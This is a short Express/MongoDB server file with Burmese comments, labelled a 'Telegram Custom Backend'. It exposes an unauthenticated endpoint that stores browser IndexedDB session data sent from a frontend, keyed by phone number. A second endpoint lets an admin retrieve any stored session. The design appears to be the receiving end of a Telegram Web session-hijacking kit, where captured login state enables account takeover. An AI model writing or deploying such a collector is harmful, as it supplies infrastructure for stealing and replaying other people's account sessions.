require('dotenv').config();
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();

// Middleware (Data အကြီးကြီးတွေ လက်ခံနိုင်အောင် limit တိုးထားပါသည်)
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

// MongoDB ချိတ်ဆက်ခြင်း
mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// MongoDB တွင် Data သိမ်းမည့် ပုံစံ (Schema)
const WebSessionSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: true, unique: true },
    indexedDbData: { type: String, required: true },
    lastUpdated: { type: Date, default: Date.now }
});
const WebSession = mongoose.model('WebSession', WebSessionSchema);

// API (၁) : Frontend မှ ပို့လိုက်သော Session ကို လက်ခံပြီး Database တွင် သိမ်းရန်
app.post('/api/save-web-session', async (req, res) => {
    const { phoneNumber, indexedDbData } = req.body;
    try {
        let session = await WebSession.findOne({ phoneNumber });
        if (session) {
            session.indexedDbData = indexedDbData;
            session.lastUpdated = Date.now();
        } else {
            session = new WebSession({ phoneNumber, indexedDbData });
        }
        await session.save();
        res.json({ success: true, message: "Session saved to MongoDB" });
    } catch (error) {
        console.error("Save Error:", error);
        res.status(500).json({ error: "Failed to save session" });
    }
});

// API (၂) : Admin မှ သက်ဆိုင်ရာ ဖုန်းနံပါတ်၏ Session ကို Database မှ ပြန်ခေါ်ရန်
app.get('/api/get-web-session/:phone', async (req, res) => {
    try {
        const session = await WebSession.findOne({ phoneNumber: req.params.phone });
        if (session) {
            res.json({ success: true, data: session.indexedDbData });
        } else {
            res.status(404).json({ error: "Session not found" });
        }
    } catch (error) {
        console.error("Fetch Error:", error);
        res.status(500).json({ error: "Failed to fetch session" });
    }
});

// သာမန် Test လုပ်ရန် URL
app.get('/', (req, res) => {
    res.send('Telegram Custom Backend is Running...');
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
